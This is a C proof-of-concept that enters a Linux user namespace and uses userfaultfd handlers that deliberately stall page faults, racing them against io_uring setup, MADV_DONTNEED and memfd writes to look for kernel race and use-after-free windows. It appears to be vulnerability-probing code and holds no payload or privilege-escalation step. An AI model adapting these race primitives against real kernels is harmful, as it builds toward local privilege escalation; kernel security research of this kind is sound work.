/*
 * userfaultfd race PoC
 * Tests if userfaultfd can stall kernel operations from user_ns
 * 
 * Build: gcc -o /tmp/uffd_race /tmp/uffd_race_poc.c -lpthread
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <linux/io_uring.h>
#include <linux/memfd.h>

#ifndef __NR_userfaultfd
#define __NR_userfaultfd 323
#endif
#ifndef __NR_io_uring_setup
#define __NR_io_uring_setup 425
#endif
#ifndef __NR_io_uring_enter
#define __NR_io_uring_enter 426
#endif
#ifndef __NR_memfd_create
#define __NR_memfd_create 319
#endif

static atomic_int fault_count = 0;
static atomic_int stop = 0;
static long uffd_global = -1;
static void *page_fault_region = NULL;

/* Thread that handles userfaultfd events - stalls intentionally */
static void *uffd_handler(void *arg)
{
    long uffd = (long)arg;
    while (!atomic_load(&stop)) {
        struct uffd_msg msg;
        int ret = read(uffd, &msg, sizeof(msg));
        if (ret <= 0) continue;
        if (msg.event != UFFD_EVENT_PAGEFAULT) continue;

        atomic_fetch_add(&fault_count, 1);
        unsigned long fault_addr = msg.arg.pagefault.address;

        /* Stall for 100ms to create race window */
        usleep(100000);

        /* Fill the page with zero page to resolve fault */
        struct uffdio_copy copy;
        copy.dst = fault_addr & ~0xfff;
        copy.src = (unsigned long)page_fault_region;
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
    return NULL;
}

/* Creates user namespace root setup */
static void enter_userns(void)
{
    if (unshare(CLONE_NEWUSER) != 0) return;
    int fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd >= 0) { dprintf(fd, "0 %d 1", getuid()); close(fd); }
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { write(fd, "deny", 4); close(fd); }
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd >= 0) { dprintf(fd, "0 %d 1", getgid()); close(fd); }
}

/* Test 1: userfaultfd + io_uring race */
static int test_uring_uffd_race(void)
{
    printf("[*] io_uring + userfaultfd race test\n");

    /* Create UFFD */
    long uffd = syscall(__NR_userfaultfd, 0);
    if (uffd < 0) { printf("    userfaultfd not available\n"); return 0; }

    /* Allocate fault region */
    void *region = mmap(NULL, 0x200000, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) { close(uffd); return 0; }
    page_fault_region = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (page_fault_region == MAP_FAILED) {
        munmap(region, 0x200000); close(uffd); return 0;
    }
    memset(page_fault_region, 0, 0x10000);

    /* Initialize UFFD */
    struct uffdio_api api = {.api = UFFD_API, .features = 0};
    if (ioctl(uffd, UFFDIO_API, &api)) {
        munmap(region, 0x200000); munmap(page_fault_region, 0x10000);
        close(uffd); return 0;
    }

    /* Register half the region */
    struct uffdio_register reg = {
        .range = {.start = (unsigned long)region, .len = 0x2000},
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);

    uffd_global = uffd;

    /* Start UFFD handler thread */
    pthread_t handler;
    pthread_create(&handler, NULL, uffd_handler, (void *)uffd);

    /* Now try to create io_uring and use region as buffer */
    for (int i = 0; i < 100 && !atomic_load(&stop); i++) {
        struct io_uring_params p = {};
        int ring = syscall(__NR_io_uring_setup, 32, &p);
        if (ring < 0) continue;

        void *sq = mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, ring, IORING_OFF_SQ_RING);
        void *cq = mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, ring, IORING_OFF_CQ_RING);
        void *se = mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, ring, IORING_OFF_SQES);
        if (sq != MAP_FAILED) munmap(sq, 4096);
        if (cq != MAP_FAILED) munmap(cq, 4096);
        if (se != MAP_FAILED) munmap(se, 4096);
        close(ring);
    }

    atomic_store(&stop, 1);
    pthread_join(handler, NULL);
    munmap(region, 0x200000);
    munmap(page_fault_region, 0x10000);
    close(uffd);

    printf("    page faults handled: %d\n", atomic_load(&fault_count));
    return 0;
}

/* Test 2: userfaultfd + MADV_DONTNEED race (classic UAF pattern) */
static void *uffd_handler_madvise(void *arg)
{
    long uffd = (long)arg;
    while (!atomic_load(&stop)) {
        struct uffd_msg msg;
        int ret = read(uffd, &msg, sizeof(msg));
        if (ret <= 0) continue;
        if (msg.event != UFFD_EVENT_PAGEFAULT) continue;

        atomic_fetch_add(&fault_count, 1);
        unsigned long fault_addr = msg.arg.pagefault.address;

        /* Stall - classic race window */
        usleep(50000);

        /* Fill page */
        struct uffdio_copy copy;
        copy.dst = fault_addr & ~0xfff;
        copy.src = (unsigned long)page_fault_region;
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
    return NULL;
}

static void *madvise_thread(void *arg)
{
    void *region = arg;
    while (!atomic_load(&stop)) {
        /* MADV_DONTNEED on the region to free pages */
        madvise(region, 0x10000, MADV_DONTNEED);
        usleep(1000);
        /* Touch pages again */
        volatile char *p = (volatile char *)region;
        for (int i = 0; i < 100; i += 4096) {
            p[i] = 'A';
        }
    }
    return NULL;
}

static int test_madvise_uffd_race(void)
{
    printf("[*] userfaultfd + MADV_DONTNEED race test\n");

    long uffd = syscall(__NR_userfaultfd, 0);
    if (uffd < 0) { printf("    userfaultfd not available\n"); return 0; }

    void *region = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED) { close(uffd); return 0; }
    memset(region, 0, 0x100000);

    page_fault_region = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (page_fault_region == MAP_FAILED) {
        munmap(region, 0x100000); close(uffd); return 0;
    }
    memset(page_fault_region, 0, 0x10000);

    struct uffdio_api api = {.api = UFFD_API, .features = 0};
    if (ioctl(uffd, UFFDIO_API, &api)) {
        munmap(region, 0x100000); munmap(page_fault_region, 0x10000);
        close(uffd); return 0;
    }

    struct uffdio_register reg = {
        .range = {.start = (unsigned long)region, .len = 0x10000},
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);

    pthread_t handler, madv_thread;
    pthread_create(&handler, NULL, uffd_handler_madvise, (void *)uffd);
    pthread_create(&madv_thread, NULL, madvise_thread, region);

    sleep(5);

    atomic_store(&stop, 1);
    pthread_join(handler, NULL);
    pthread_join(madv_thread, NULL);
    munmap(region, 0x100000);
    munmap(page_fault_region, 0x10000);
    close(uffd);

    printf("    page faults handled: %d\n", atomic_load(&fault_count));
    return 0;
}

/* Test 3: userfaultfd + memfd + read race */
static void *uffd_handler_fd(void *arg)
{
    long uffd = (long)arg;
    while (!atomic_load(&stop)) {
        struct uffd_msg msg;
        int ret = read(uffd, &msg, sizeof(msg));
        if (ret <= 0) continue;
        if (msg.event != UFFD_EVENT_PAGEFAULT) continue;

        unsigned long fault_addr = msg.arg.pagefault.address;
        usleep(50000);

        struct uffdio_copy copy = {
            .dst = fault_addr & ~0xfff,
            .src = (unsigned long)page_fault_region,
            .len = 0x1000,
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
    return NULL;
}

static int test_memfd_uffd_race(void)
{
    printf("[*] userfaultfd + memfd read race test\n");
    long uffd = syscall(__NR_userfaultfd, 0);
    if (uffd < 0) { printf("    userfaultfd not available\n"); return 0; }

    void *buf = mmap(NULL, 0x100000, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { close(uffd); return 0; }
    memset(buf, 0x41, 0x100000);

    page_fault_region = mmap(NULL, 0x10000, PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (page_fault_region == MAP_FAILED) { munmap(buf, 0x100000); close(uffd); return 0; }
    memset(page_fault_region, 0, 0x10000);

    struct uffdio_api api = {.api = UFFD_API, .features = 0};
    ioctl(uffd, UFFDIO_API, &api);

    struct uffdio_register reg = {
        .range = {.start = (unsigned long)buf, .len = 0x10000},
        .mode = UFFDIO_REGISTER_MODE_MISSING
    };
    ioctl(uffd, UFFDIO_REGISTER, &reg);

    pthread_t handler;
    pthread_create(&handler, NULL, uffd_handler_fd, (void *)uffd);

    int memfd = syscall(__NR_memfd_create, "test", 0);
    if (memfd >= 0) {
        write(memfd, buf, 0x1000);
        close(memfd);
    }

    atomic_store(&stop, 1);
    pthread_join(handler, NULL);
    munmap(buf, 0x100000);
    munmap(page_fault_region, 0x10000);
    close(uffd);

    printf("    page faults handled: %d\n", atomic_load(&fault_count));
    return 0;
}

int main(void)
{
    printf("=== Userfaultfd Race PoC ===\n");

    /* Fork to enter user namespace */
    pid_t pid = fork();
    if (pid == 0) {
        /* Child in user namespace */
        enter_userns();

        printf("[*] Running tests inside user namespace\n");
        printf("[*] UID: %d, EUID: %d\n", getuid(), geteuid());
        printf("\n");

        test_uring_uffd_race();
        test_madvise_uffd_race();
        test_memfd_uffd_race();

        printf("\n[*] Tests completed\n");
        _exit(0);
    } else if (pid > 0) {
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("\n!!! CHILD CRASHED with signal %d !!!\n", WTERMSIG(status));
            return 1;
        }
        if (WIFEXITED(status)) {
            printf("[*] Child exited with status %d\n", WEXITSTATUS(status));
        }
    }

    return 0;
}
